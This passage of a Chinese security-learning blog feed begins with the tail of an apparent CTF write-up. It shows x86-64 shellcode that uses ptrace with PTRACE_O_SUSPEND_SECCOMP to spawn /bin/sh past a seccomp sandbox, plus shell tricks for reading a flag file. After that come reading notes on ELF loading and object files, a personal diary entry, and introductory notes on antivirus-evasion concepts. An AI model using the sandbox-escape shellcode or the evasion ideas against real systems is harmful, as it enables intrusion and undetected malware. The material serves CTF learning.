rdx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    mov rax,35</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 59</span></span><br><span class="line"><span class="string">    mov rbx,0x&#123;order2&#125; </span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rbx, 0x&#123;order1&#125; </span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>对应的伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line">ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;<span class="comment">//子进程</span></span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ptrace(PTRACE_SETOPTIONS,pid,<span class="number">0</span>,PTRACE_O_SUSPEND_SECCOMP)</span><br><span class="line">        ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214096416-98d3111d-f787-43c9-9d9c-0f0766b4dae1.png" alt="img"></p><p>在Q爷文章中最后提到，给出的shell并没有ls和cat的功能，但是可以用对应代码代替</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># ls</span></span><br><span class="line">echo *</span><br><span class="line"></span><br><span class="line"><span class="meta"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = read -r line; </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    echo <span class="string">&quot;$line&quot;</span></span><br><span class="line">done &lt; flag</span><br></pre></td></tr></table></figure><p>最后</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214453067-8e33a529-ea32-4953-bdab-46d9de921250.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《程序员自我修养-链接、装载与库》第六章 可执行文件的装载与进程 读书笔记</title>
      <link href="/2024/03/29/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/29/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>可执行文件只有装载到内存以后才能被CPU执行，早起装载基本上就是把程序从外部存储器读取到内存中某个位置。但是硬件MMU诞生，多进程，多用户，虚拟存储的操作系统，装载过程变得复杂起来。</p><p>作者介绍在ELF文件在linux下的装载过程。来为我们解答一些问题。</p><p><strong>首先什么是进程的虚拟地址空间？</strong></p><p><strong>为什么进程要有自己独立的虚拟地址空间？</strong></p><p>我们从历史的角度来看看装载的几种方式，包括覆盖装载、页映射。</p><p>接着还会介绍进程虚拟地址空间的分布情况。</p><h1 id="6-1-进程虚拟地址空间"><a href="#6-1-进程虚拟地址空间" class="headerlink" title="6.1 进程虚拟地址空间"></a>6.1 进程虚拟地址空间</h1><p>程序是一个静态的概念，进程是一个动态的概念。程序是一道菜谱，进程便是炒菜的一个过程。</p><p>我们知道每个程序运行起来以后，拥有自己的虚拟地址空间。其由CPU的位数决定。</p><p>硬件决定了地址空间的最大理论上限，即硬件的寻址空间大小。</p><p>32位就0<del>2^31-1，即0x00000000</del>0xffffffff，也就是4GB；而64位则64位寻址能力，即2^64字节，即17179869184GB，看似是无限的，但是实际上在未来的一段时间后，我们也会觉得这个地址不够用。</p><p><strong>那么在32位的4GB空间中，我们程序是否可以任意使用？</strong></p><p>很遗憾，并不可以。因为操作系统还要监管程序运行，我们要给其分配一段空间。</p><p>Linux操作系统将进程的虚拟地址空间做了如图分配</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_6_1.png"></p><p>我们只看左边，4gb被分成了两部分，用户和内核地址。原则上说我们最多用3GB的虚拟空间，但是在现代程序中，明显这是不够用的（这里不是讲64位，而是依然是32位，虽然64位才是一本万利的选择）。PAE机制能够让我们在32位下使用超过4GB的内存空间。这点我们后面会说。</p><p>Window则2gb&#x2F;2gb这样分，也可以让操作系统占用的内存空间减少到1GB，在windows系统盘根目录下的Boot.ini加个“&#x2F;3g”参数</p><h2 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h2><p>从硬件层面来讲，Inter将32位地址线拓展到36位之后，修改了页映射的，这样可以访问更多的物理地址。这个扩展方式就叫做PAE。</p><p><strong>那么应用程序该如何使用这些大于常规的内存呢？</strong></p><p>一个很常见的方法是窗口映射，比如一段256MB的空间（0x10000000-20000000），程序可以从高于4GB的物理空间中多申请多个大小为256MB的物理空间，编号为A,B,C,D等，然后将这个窗口映射到不同的物理块，用到A时将0x10000000~0x20000000映射到A，用到B，C再映射到B,C对应的物理地址上去。</p><p>windows下，这种访问内存的操作方式叫做AWE（address windowing Extensions）；Linux则用mmap()系统调用来实现。</p><p>当然这只是一种补救措施罢了。</p><h1 id="6-2-装载的方式"><a href="#6-2-装载的方式" class="headerlink" title="6.2 装载的方式"></a>6.2 装载的方式</h1><p><strong>程序在装载时拥有局部性原理</strong>，如果一股脑把程序全部丢进内存，那很明显是不够用的。而且内存很贵，增加内存也是不现实的。因此我们可以把常用的部分留在内存，不常用的放在磁盘，这就是动态装入的基本原理。</p><p>覆盖装入和页映射是两种典型的装载方式，这里我们来介绍。</p><h2 id="覆盖装入"><a href="#覆盖装入" class="headerlink" title="覆盖装入"></a>覆盖装入</h2><p>覆盖装入在没有发明虚拟存储之前使用比较广泛，现在已经淘汰了。但是它的一些思想还是很有意义的。</p><p>在一些现代嵌入式的内存受限环境下，特别是诸如DSP等，这种方法或许还有用武之地。</p><p>覆盖装入把挖掘内存潜力的任务交给了程序员，程序员在编写程序时要把其分成若干块，然后编写一个小小的辅助代码（覆盖管理器）来管理这些模块应该何时驻留内存之中，何时被替换掉。</p><p>最简单的情况下，一个main模块会调用到模块A和模块B，但是AB之间没有相互调用的关系。假设这三个模块的大小分别为1024,512,256字节。不考虑内存对齐，装载地址限制的情况下，理论上运行这个程序需要有1792个字节的内存。此时在内存中应该这样安排。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_6_2.png"></p><p>由于AB之间没有相互调用的依赖关系，因此可以相互覆盖。这样就省下了一些字节。</p><p>所以程序要把这些模块手动分成一个树状结构来表示其调用依赖关系。但是要注意两点：</p><ol><li><ol><li>这个树状结构中从任意一个模块到树的根的模块都叫调用路径。调用路径上的模块必须保存在内存中，如main-&gt;A-&gt;D。</li><li>禁止跨树间调用</li></ol></li></ol><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_6_3.png"></p><p>当然跨模块间的调用要经过覆盖管理器，以确保所有被调用的模块都能够驻留在内存。</p><p>覆盖装入的速度肯定还是比较慢的。</p><h2 id="页映射"><a href="#页映射" class="headerlink" title="页映射"></a>页映射</h2><p>它是虚拟存储机制的一部分，由其发明而诞生。这里我们结合可执行文件的装载来阐述一下页映射是如何应用到动态装载中去的。</p><p>页映射将磁盘中数据和指令按照“页”为单位划分为若干个页。硬件规定页的大小有4096字节、8192字节、2MB、4MB等。InterA32一般使用4096字节的页。</p><p>假设我们有如下页，有16KB大小内存，这些页的大小为4KB。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_6_4.png"></p><p>如果我们的程序是P0~P7有32KB的程序，我们16KB空间显然无法直接装入。</p><p>假设程序刚开始执行时的入口地址在P0，这时装载管理器（假设控制装载的叫这个名字）会把F0分配给P0，然后运行一段时间需要用到其他程序的页，如P5,P3,P6，会将P5分配到F1，P3分配到F2，P6分配到F3。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_6_5.png"></p><p>那么此时应该占满了16KB的内存了吧。如果还要装入P4，那么装载器必须做出选择，舍弃哪个页来装入。</p><p>我们有很多算法来决定选择哪个页，比如FIFO算法，或者最少使用算法LUA。</p><p>很多人可能猜到了，这个所谓的装载器其实就是我们的操纵系统，更精确的说，是它的存储管理器。目前几乎所有主流的操作系统都是按照这种方式装载的。</p><h1 id="6-3-从操作系统角度看可执行文件的装载。"><a href="#6-3-从操作系统角度看可执行文件的装载。" class="headerlink" title="6.3 从操作系统角度看可执行文件的装载。"></a>6.3 从操作系统角度看可执行文件的装载。</h1><p>可执行文件中的页可以被装入任意页，从上面的页映射的动态装入的方式可以看到。</p><p>如果程序使用物理地址直接进行操作，那么每次页被装入时都需要进行重定位。</p><p>在虚拟存储中，现代硬件的MMU地址都提供地址转换的功能。有了硬件的地址转换和页映射机制，操作系统动态加载和静态加载有很大区别。本节我们将站在一个操作系统的角度来看可执行文件的装载。</p><h2 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h2><p><strong>从操作系统角度看，一个进程最关键的特征是它拥有独立的虚拟地址空间。</strong></p><p>创建一个进程，然后装载相应的可执行文件并且执行，在有虚拟存储的情况下，上述过程最开始只需要做三件事情：</p><ol><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系。</li><li>将CPU的指令寄存器设置成可执行文件的入口地址，启动并运行。</li></ol><h3 id="创建虚拟空间"><a href="#创建虚拟空间" class="headerlink" title="创建虚拟空间"></a>创建虚拟空间</h3><p>一个虚拟空间由一组映射函数将虚拟空间的页映射到物理空间，<strong>创建虚拟空间</strong>不是创建映射函数，而<strong>是创建对应的数据结构</strong>。在i386Linux下，创建虚拟空间实际上只是分配一个页目录，甚至不需要设置映射关系，这些映射关系等到后面程序发生页错误再进行设置。</p><p>感觉有点绕？听不懂？不急，后面会解释</p><p>这里是 虚拟空间映射到物理空间 的过程</p><h3 id="建立虚拟空间和可执行文件的映射"><a href="#建立虚拟空间和可执行文件的映射" class="headerlink" title="建立虚拟空间和可执行文件的映射"></a>建立虚拟空间和可执行文件的映射</h3><p>这一步做的是虚拟空间和可执行文件的映射关系，</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> books-reading </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《黑客免杀攻防》第一章 变脸 读书笔记</title>
      <link href="/2024/03/27/%E3%80%8A%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E6%94%BB%E9%98%B2%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%8F%98%E8%84%B8-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/27/%E3%80%8A%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E6%94%BB%E9%98%B2%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%8F%98%E8%84%B8-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>2023&#x2F;10&#x2F;11日</p><p>这一章基本做一个介绍，对于一个小白来说，这个介绍写的很好，看了就很吸引人。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>免杀也就是反病毒，反间谍的对立面，可以说是反-反病毒，是一个反杀毒技术。除了使木马免于被查杀外，还可以扩增病毒木马的功能，改变病毒木马的行为。</p><h2 id="免杀技术的简单原理"><a href="#免杀技术的简单原理" class="headerlink" title="免杀技术的简单原理"></a>免杀技术的简单原理</h2><p>最初接触免杀技术，会有特征码在这一概念，作者对于特征码提出了三个问题，笔者认为这有助于我们去思考</p><p>“特征码究竟是什么？”“特征码是如何被定位出来的？”“除此之外，还有什么？”</p><p>免杀源于特征码，杀毒软件也源于特征码</p><p><strong>特征码是什么？</strong></p><p>它是从反病毒领域引进来的一个词，意为病毒或木马所特有的一段二进制码</p><p>反病毒公司的工作人员获得一个病毒样本，最重要的就是提取出特征码。</p><p><strong>那么他是如何找到特征码的呢？</strong></p><p>这里作者举了个特殊例子，我简单说明，就是从危险指令定位特征码，比如格式化所有硬盘指令，一般程序并不会执行这些指令。</p><p>杀毒软件所用的特征码都是复杂的，一般由数段特征片段加上一定逻辑判断机制组合而成。</p><p>当然我们可以有计划的向木马文件中填充垃圾信息，这样不会被定位了。</p><p>这些以后细讲。</p><h2 id="免杀技术和其他技术的区别"><a href="#免杀技术和其他技术的区别" class="headerlink" title="免杀技术和其他技术的区别"></a>免杀技术和其他技术的区别</h2><h3 id="免杀技术不是rootkit技术"><a href="#免杀技术不是rootkit技术" class="headerlink" title="免杀技术不是rootkit技术"></a>免杀技术不是rootkit技术</h3><p>免杀和Rootkit最终目的都是隐藏自己不被其他程序发现。Rootkit的实质是指一组非常直接的工具，免杀只是使用这组工具的方法之一</p><p>其实这里我并没有完全理解，因为我零基础，不了解rootkit技术，到时候回来补充笔记</p><p>现在免杀主要分为三种，其中一种就是行为免杀，也就是通过控制病毒木马的行为来达到躲过杀毒软件主动防御的目的。然后介绍了免杀处理技术和一种Rootkit的关系</p><p>Rootkit并不代表免杀技术，只是构成高级免杀技巧的组成部分。</p><h2 id="免杀不是加密解密技术"><a href="#免杀不是加密解密技术" class="headerlink" title="免杀不是加密解密技术"></a>免杀不是加密解密技术</h2><ul><li>加密解密是针对一个程序展开研究，免杀技术任何时候都是针对两个</li><li>加密解密是以某一程序为媒介所产生的技术对抗（保护者和破译人），免杀是一个程序和另一个程序的技术对抗（杀毒软件和木马）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> books-reading </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>碎碎念0x0</title>
      <link href="/2024/03/27/%E7%A2%8E%E7%A2%8E%E5%BF%B50x0/"/>
      <url>/2024/03/27/%E7%A2%8E%E7%A2%8E%E5%BF%B50x0/</url>
      
        <content type="html"><![CDATA[<p>三天感觉浪费了一天半，都是花在游戏上，快睡着前去思考，应不应该？</p><p>玩游戏到底是为了什么？</p><p>周三周四快要晚上的时候，收到好友的邀请一起玩游戏，一起玩会游戏有什么不好？</p><p>但是玩完下线的时候，自己还觉得不够过瘾，周三周四晚上都是这样，所以又多玩到深夜。仔细算了算，这周起码三次熬夜到三点了，</p><p>但是现在才只是周五下午。原本12点停止游戏，1点睡觉，到底是因为什么被打破？这样熬夜下去，感觉做不到的事情越来越多了，首先就是这个东西做不到；其次，熬夜对我来说，等于花费第二天早上的时间，去放纵自己。你真的确定这一天要这样吗？会这样发展成一个星期这样？发展成一个月这样？好好想清楚吧。</p>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员自我修养:链接、装载与库》第三章 目标文件有什么？</title>
      <link href="/2024/03/27/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/27/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>编译器编译源代码后生成的文件叫做目标文件。</p><h1 id="3-1目标文件的格式"><a href="#3-1目标文件的格式" class="headerlink" title="3.1目标文件的格式"></a>3.1目标文件的格式</h1><p>windows下的可执行格式是PE文件，Linux则是ELF，它们都是COFF格式而来。</p><p>目标文件就是源代码编译后但未进行链接的那些中间文件。</p><p>动态链接库(.ddl)(.so)和静态链接库(.lib)(.a)都按照可执行文件存储。</p><p>静态链接库可理解成多个目标文件捆绑在一起的包。</p><p>下面是ELF文件相关的一个总结图，建议看看。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085119003.jpg"></p><p>随后书下面就讲了一些 目标文件和可执行文件的小历史 这里不做概括</p><p>COFF的主要贡献就是在目标文件中引入了段的机制。</p><h1 id="3-2目标文件是什么样的"><a href="#3-2目标文件是什么样的" class="headerlink" title="3.2目标文件是什么样的?"></a>3.2目标文件是什么样的?</h1><p><strong>目标文件</strong>其实已经是二进制文件了。里面有机器指令代码和数据。</p><p>当然它<strong>还有链接时需要的一些信息，比如符号表，调试信息，字符串等</strong>。</p><p>一般目标文件将这些信息按照不同的属性，<strong>以“节”的形式存储</strong>，有时候也叫做“段”。节与节之间唯一的区别就是ELF的链接视图和装载视图的时候，此处节和段都叫段。</p><p><strong>编译后的机器指令通常放在代码段（.text)，全局变量和局部静态变量放在数据段(.data)。</strong></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085552659.jpg"></p><p>从上图可以看到，<strong>ELF文件开头是“文件头”</strong>，它描述了整个文件的属性（包括是否可执行、静态链接还是动态、入口地址、目标硬件、目标操作系统）<strong>其中还包括一个段表</strong>，<strong>是描述文件中各个段的数组（描述各个段在文件的偏移和属性）。</strong></p><p>值得一提的是，初始化的全局变量和局部静态变量保存在data段；未初始化的全局变量和局部静态变量保存在bss段。但是本来它们应该在data段的，但是因为没初始化，都是0，程序不给存放数据0预留空间，所以此时bss段只是给它们预留位置而已。</p><p>总的来说，程序指令去了text代码段，程序数据去了data和bss段。</p><hr><p>把文件分开来放的好处:</p><ol><li>程序被装载后，数据和指令将分别被映射到两个虚拟内存区域  </li><li>对于CPU来说，它们有着极为强大的缓存体系（有必要提高缓存的命中率）。</li><li>当程序运行多个该程序的副本时，指令只用在一个地方读取，程序的其他数据就可以共享，以用来节省空间。</li></ol><h1 id="3-3挖掘SimpleSection-o"><a href="#3-3挖掘SimpleSection-o" class="headerlink" title="3.3挖掘SimpleSection.o"></a>3.3挖掘SimpleSection.o</h1><p>这里是用readelf来分析文件的格式，笔者只是简单总结一下学到的东西，就不做赘述，建议跟着原文看一遍（P61开始）</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_3_3.jpg"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -h SimpleSection.o</span><br></pre></td></tr></table></figure><p>-h是把ELF各个段的基本信息打印出来，-x可以把更多信息打印出来。</p><p>这里多了打印出来除了上面提到的段的话，还有三个段(.rodata)只读数据段，(.comment)注释信息段，（.note.GNU-stack）堆栈提示段（此处是0，暂且忽略它）。此ELF文件事实上存在的段就只有text，data，rodata，comment这四个段了。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/ca5b3bcd84d6debdbc422e6c8f3cbcb.png"></p><h2 id="3-3-1-代码段"><a href="#3-3-1-代码段" class="headerlink" title="3.3.1 代码段"></a>3.3.1 代码段</h2><p>主要是对着格式分析,此处不再赘诉</p><h2 id="3-3-2数据段和只读数据段"><a href="#3-3-2数据段和只读数据段" class="headerlink" title="3.3.2数据段和只读数据段"></a>3.3.2数据段和只读数据段</h2><p>主要是对着格式分析,此处不再赘诉</p><hr><p>“rodata”存放只读数据,语义上支持了C++的const关键字，又保证了程序安全性。另外再某些嵌入式平台下，有些存储区域是采用只读存储器的，如ROM，这样将“.rodata”段放在该存储区域中就可以保证程序访问存储器的正确性。</p><p>另外值得一提的是，有时候编译器会把字符串常量放到data段，可以试试把文件名改成.cpp，然后用各种MSVC编译器编译一下</p><p>然后后面根据它展示的内容，小小讲到了大小端序，在本书的附录有详细介绍，到时候去看。</p><h2 id="3-3-3BSS段"><a href="#3-3-3BSS段" class="headerlink" title="3.3.3BSS段"></a>3.3.3BSS段</h2><p>上面说过，bss段存放未初始化的全局变量和局部静态变量。</p><p>通过bss段的符号是否被定义，是否存放在目标文件的BSS段，引出了“弱符号和强符号和common块”这两个概念，在下一章会讨论这个问题。</p><p>编译器优化有时候会给我们分析系统软件背后的机制带来很多在障碍，使很多问题不能够一目了然，本书尽量避开优化过程，还原机制和原理本身</p><h2 id="3-3-4其他段"><a href="#3-3-4其他段" class="headerlink" title="3.3.4其他段"></a>3.3.4其他段</h2><p>这张图片帮忙说了很多，一下子概括了整整一小节的内容，后仅做补充</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085644558.jpg"></p><h3 id="自定义段"><a href="#自定义段" class="headerlink" title="自定义段"></a>自定义段</h3><p>有些时候我们可能希望变量或者某部分代码放到指定的段去，实现某些特定功能。比如为了满足某些硬件的内存和I&#x2F;O地址布局，或者是像Linux操作系统内核中用来完成一些初始化和用户空间复制时出现页错误异常等。</p><p>GCC提供了一个扩展机制，使得程序员可以指定变量所处的段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((section(<span class="string">&quot;FOO&quot;</span>))) <span class="type">int</span> global=<span class="number">42</span></span><br><span class="line">__attribute__((section(<span class="string">&quot;BAR&quot;</span>))) <span class="type">void</span> foo()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在全局变量或者函数之前加入“<strong>attribute</strong>((section(“name”)))”属性，就可以把相应的变量和函数放到以“name”作为段名的段中。</p><h1 id="3-4ELF文件结构描述"><a href="#3-4ELF文件结构描述" class="headerlink" title="3.4ELF文件结构描述"></a>3.4ELF文件结构描述</h1><p>先放ELF文件结构预览图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085763485.jpg"></p><p>ELF目标文件格式最前面是ELF文件头（包含了整个文件的基本属性，比如ELF文件版本、目标机器型号、程序入口地址等）紧接着是ELF各个段。</p><p><strong>其中与ELF中和段的重要结构就是段表（SHtable），表中描述了（段名，段长度，偏移，读写权限以及其他）段的属性。</strong></p><h2 id="3-4-1文件头"><a href="#3-4-1文件头" class="headerlink" title="3.4.1文件头"></a>3.4.1文件头</h2><p>直接上图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085850283.jpg"></p><p>ELF文件头定义了ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表的位置和长度及段的数量等。</p><p>ELF文件头结构以及相关常数被定义在“&#x2F;usr&#x2F;include&#x2F;elf.h”里，<strong>ELF有32和64位的版本。不同版本的成员大小不一样，但是ELF文件头内容基本上一样</strong>，它们文件头分别叫做“Elf32_Ehdr”和“Elf64_Ehdr”。“elf.h”使用typedef定义了一套自己的变量体系。</p><p>一下是Elfxx_Ehdr的结构体图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085883441.jpg"></p><p>然后较详细介绍了ELF头部结构体一些成员的含义，比如ELF魔数、ELF_type，系统一般通过ELF_type来判断它是ET_REL，ET_EXEC，ET_DYN这三种之一的文件。</p><details class="lake-collapse"><summary id="u4c678d99"><span class="ne-text">ELF头部结构体一些成员的含义</span></summary><p id="u60014499" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085943016.jpg" width="1025" id="u5587b1b1" class="ne-image"></p><p id="ubd04a8f1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085995128.jpg" width="1006" id="u32a9dd32" class="ne-image"></p></details><h2 id="3-4-2段表"><a href="#3-4-2段表" class="headerlink" title="3.4.2段表"></a>3.4.2段表</h2><p><strong>段表存放段的基本属性的结构</strong>，位置由ELF文件头的“e_shoff”成员决定。</p><p>我们可以看ELF文件段表的基本内容</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086037825.jpg"></p><p>段表的结构比较简单，它是一个以“Elf32_Shdr”（也叫段描述符）结构体为元素的数组。每个结构体意味着一个段的信息。ELF段表第一个元素是无效的段描述符。</p><p>“Elf32_Shdr”被定义在”&#x2F;usr&#x2F;include&#x2F;elf.h”，如图:</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086102351.jpg"></p><details class="lake-collapse"><summary id="u86eb7fea"><span class="ne-text">各个成员含义如下</span></summary><p id="u75baa19b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/3ad734d862830a85f303d8c2d7b496e.png" width="576" id="u9500522c" class="ne-image"></p></details><hr><p>这里简单说一下段的标志位，表示该段在进程虚拟地址空间的属性，比如是否可写，是否可执行等。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/a945ceae467dd87f8b4268d7c01942d.png"></p><hr><p>然后再简单说一下段的链接信息(sh_link、sh_info)</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086244994.jpg"></p><h2 id="3-4-3重定位表"><a href="#3-4-3重定位表" class="headerlink" title="3.4.3重定位表"></a>3.4.3重定位表</h2><p>如果一个段的类型是”SHT_REL”，也就是说它是一个<strong>重定位表</strong>，对于每个需要重定位的段都有一个相应的重定位表</p><p>比如”.rel.text”就是对”.text”的重定位表。此时sh_link表示符号表的下标，sh_info表示它作用域哪个段。</p><p>下一章静态链接过程的时候，再细细分析。</p><h2 id="3-4-4字符串表"><a href="#3-4-4字符串表" class="headerlink" title="3.4.4字符串表"></a>3.4.4字符串表</h2><p>一般字符串表在ELF文件中也以段的形式存储，常见的段名是“.strtab”或者“.shstrtab”。分别代表“字符串表”和“段表字符串表”。</p><h1 id="3-5链接的接口——符号"><a href="#3-5链接的接口——符号" class="headerlink" 